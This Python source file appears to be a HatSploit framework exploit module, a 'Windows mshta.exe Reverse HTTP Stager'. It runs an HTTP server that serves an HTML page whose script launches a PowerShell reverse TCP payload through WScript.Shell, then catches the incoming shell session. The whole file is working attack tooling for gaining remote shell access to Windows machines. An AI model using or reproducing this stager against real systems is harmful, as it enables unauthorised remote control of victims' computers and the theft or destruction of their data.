#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from hatsploit.lib.jobs import Jobs

from hatsploit.utils.handler import Handler
from hatsploit.utils.http import HTTPClient


class HatSploitModule(Module, Handler, HTTPClient):
    jobs = Jobs()

    details = {
        'Name': "Windows mshta.exe Reverse HTTP Stager",
        'Module': "exploit/windows/stager/mshta_reverse_http",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer'
        ],
        'Description': "Windows mshta.exe reverse HTTP stager.",
        'Comments': [
            ''
        ],
        'Platform': "windows",
        'Risk': "high"
    }

    payload = {
        'Description': "Payload to use.",
        'Value': "windows/generic/powershell_reverse_tcp",
        'Categories': None,
        'Architectures': None,
        'Platforms': [
            'windows'
        ],
        'Types': None
    }

    options = {
        'SRVHOST': {
            'Description': "Local host to start http server on.",
            'Value': "0.0.0.0",
            'Type': "ip",
            'Required': True
        },
        'SRVPORT': {
            'Description': "Local port to start http server on.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        },
        'FOREVER': {
            'Description': "Start listener forever.",
            'Value': "no",
            'Type': "boolean",
            'Required': False
        },
        'URLPATH': {
            'Description': "File path on server.",
            'Value': "/",
            'Type': None,
            'Required': True
        }
    }

    def serve_mshta(self, local_host, local_port, url_path, payload):
        payload = f"<html><head><script>var c= \"{payload}\"\n"
        payload += "new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>"

        mshta_job = self.jobs.create_job(
            "Windows mshta.exe HTTP Server",
            self.details['Module'],
            self.start_server,
            (
                local_host,
                local_port,
                payload,
                False,
                url_path
            )
        )

    def run(self):
        local_host, local_port, forever, url_path = self.parse_options(self.options)

        if forever.lower() in ['yes', 'y']:
            while True:
                status = self.handle_session(
                    host=local_host,
                    port=local_port,
                    payload=self.payload,
                    sender=self.serve_mshta,
                    args=[local_host, local_port, url_path],
                    timeout=None
                )

                if not status:
                    return
        else:
            self.handle_session(
                host=local_host,
                port=local_port,
                payload=self.payload,
                sender=self.serve_mshta,
                args=[local_host, local_port, url_path],
                timeout=None
            )
